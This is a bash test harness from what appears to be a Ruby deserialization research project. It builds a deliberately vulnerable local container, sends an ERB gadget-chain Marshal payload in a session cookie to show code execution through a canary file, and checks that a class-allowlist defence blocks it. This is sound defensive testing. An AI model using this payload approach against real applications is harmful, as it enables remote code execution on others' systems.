#!/usr/bin/env bash
# ©AngelaMos | 2026
# target-gate.sh

set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

IMAGE="marshalsea-target:local"
CONTAINER="marshalsea-target-gate"
PORT="${MARSHALSEA_TARGET_PORT:-47823}"
BASE="http://127.0.0.1:${PORT}"
CANARY_MARKER="fired"

cleanup() {
    docker rm -f "${CONTAINER}" >/dev/null 2>&1 || true
}
trap cleanup EXIT

echo "building target image"
docker build -q -f "${HERE}/target/Dockerfile" -t "${IMAGE}" "${HERE}" >/dev/null || {
    echo "FAIL image build"
    exit 1
}

cleanup
docker run -d --name "${CONTAINER}" \
    --network bridge \
    --read-only \
    --tmpfs /tmp:rw,noexec,nosuid,size=1m \
    -p "127.0.0.1:${PORT}:4567" \
    "${IMAGE}" >/dev/null

for _ in $(seq 1 40); do
    curl -sf "${BASE}/" >/dev/null 2>&1 && break
    sleep 0.5
done

if ! curl -sf "${BASE}/" >/dev/null 2>&1; then
    echo "FAIL target never became reachable on ${PORT}"
    docker logs "${CONTAINER}" 2>&1 | tail -20
    exit 1
fi

echo
curl -s "${BASE}/" | head -3
echo

payload="$(docker run --rm --network none -v "${HERE}/lib:/app/lib:ro" -w /app ruby:4.0-slim \
    ruby -Ilib -e '
require "marshalsea"
require "base64"
chain = Marshalsea::Chains::ErbDefMethod.canary("/tmp/marshalsea-canary", "fired")
state = { user: "attacker", template: chain.generate }
print Base64.strict_encode64(Marshal.dump(state))
')"

if [[ -z "${payload}" ]]; then
    echo "FAIL payload generation produced nothing"
    exit 1
fi

failures=0

before="$(curl -s "${BASE}/canary")"
vulnerable_body="$(curl -s --cookie "session_state=${payload}" "${BASE}/render")"
after="$(curl -s "${BASE}/canary")"

echo "  vulnerable endpoint : ${vulnerable_body}"
echo "  canary before/after : ${before} -> ${after}"

if [[ "${after}" == "${CANARY_MARKER}" && "${before}" != "${CANARY_MARKER}" ]]; then
    echo "  PASS   HTTP request achieved code execution through Marshal.load"
else
    echo "  FAIL   payload did not execute over HTTP"
    failures=$((failures + 1))
fi

docker exec "${CONTAINER}" rm -f /tmp/marshalsea-canary >/dev/null 2>&1 || true

reset="$(curl -s "${BASE}/canary")"
safe_body="$(curl -s --cookie "session_state=${payload}" "${BASE}/render/safe")"
safe_after="$(curl -s "${BASE}/canary")"

echo
echo "  defended endpoint   : ${safe_body}"
echo "  canary before/after : ${reset} -> ${safe_after}"

if [[ "${safe_after}" != "${CANARY_MARKER}" && "${safe_body}" == rejected* ]]; then
    echo "  PASS   defended endpoint rejected the identical payload"
else
    echo "  FAIL   defended endpoint did not reject the payload"
    failures=$((failures + 1))
fi

jar="$(mktemp)"
curl -s -X POST "${BASE}/session" -d "" -c "${jar}" >/dev/null
benign="$(awk '$6 == "session_state" {print $7}' "${jar}")"
rm -f "${jar}"

echo
if [[ -z "${benign}" ]]; then
    echo "  FAIL   could not obtain a benign session, the control did not run"
    failures=$((failures + 1))
else
    benign_body="$(curl -s --cookie "session_state=${benign}" "${BASE}/render/safe")"
    echo "  benign on defended  : ${benign_body}"
    if [[ "${benign_body}" == rejected* ]]; then
        echo "  FAIL   defended endpoint rejects legitimate sessions, it is not a filter"
        failures=$((failures + 1))
    else
        echo "  PASS   defended endpoint still serves a legitimate session"
    fi
fi

echo
encode() {
    docker run --rm --network none ruby:4.0-slim \
        ruby -e "require \"base64\"; print Base64.strict_encode64(Marshal.dump($1))"
}

for root in '"plain string"' 'nil' '[1, 2]' '{ user: "x" }'; do
    body_file="$(mktemp)"
    code="$(curl -s -o "${body_file}" -w '%{http_code}' \
        -H "Cookie: session_state=$(encode "${root}")" "${BASE}/render/safe")"
    body="$(head -c 80 "${body_file}")"
    rm -f "${body_file}"
    echo "  defended on root ${root} : HTTP ${code} ${body}"
    if [[ "${code}" == "500" ]]; then
        echo "  FAIL   the defence accepted this root and then crashed compiling it"
        failures=$((failures + 1))
    fi
done

echo
leak_file="$(mktemp)"
curl -s -o "${leak_file}" -H "Cookie: session_state=$(encode 'nil')" "${BASE}/render/safe"
curl -s -o "${leak_file}.v" -H "Cookie: session_state=$(encode 'nil')" "${BASE}/render"
if grep -qE "app\.rb|/app/lib|marshalsea/marshal" "${leak_file}" "${leak_file}.v"; then
    echo "  FAIL   an error response leaked source paths or source lines"
    failures=$((failures + 1))
else
    echo "  PASS   error responses leak no source path or source line"
fi
rm -f "${leak_file}" "${leak_file}.v"

echo
class_named() {
    docker run --rm --network none ruby:4.0-slim ruby -e "
require \"base64\"
def sym(n) = \":\" + (n.bytesize + 5).chr + n
def str(s) = %q(\") + (s.bytesize + 5).chr + s
print Base64.strict_encode64($1)
"
}

for probe in 'Marshal.dump(Object.new)' '("\x04\x08C" + sym("String") + str("hi")).b'; do
    named_body="$(curl -s -H "Cookie: session_state=$(class_named "${probe}")" "${BASE}/render/safe")"
    echo "  class-named stream  : ${named_body}"
    if [[ "${named_body}" == *"unapproved class"* ]]; then
        echo "  PASS   refused on the class name itself, not on a parse error"
    else
        echo "  FAIL   PERMITTED_CLASS_NAMES admitted a class name, or something else rejected it first"
        failures=$((failures + 1))
    fi
done

echo
sinks="$(docker run --rm --network none -v "${HERE}/lib:/app/lib:ro" -w /app ruby:4.0-slim \
    ruby -Ilib -e '
require "marshalsea"
require "base64"
chain = Marshalsea::Chains::ErbDefMethod.canary("/tmp/marshalsea-canary", "fired")
blob = Marshal.dump({ user: "attacker", template: chain.generate })
result = Marshalsea::Marshal::Parser.new(blob).parse
print result.sinks.length
')"

echo "  sink-tag hits on the working payload : ${sinks}"
if [[ "${sinks}" == "0" ]]; then
    echo "  NOTE   sink detection alone does NOT catch this chain, only the class"
    echo "         allowlist does. ERB defines no marshal_load, so it serializes as"
    echo "         a plain object and carries no sink tag."
else
    echo "  FAIL   expected the ERB chain to carry no sink tag, got ${sinks}"
    failures=$((failures + 1))
fi

echo
if [[ ${failures} -eq 0 ]]; then
    echo "GATE PASSED"
    exit 0
fi

echo "GATE FAILED (${failures})"
exit 1
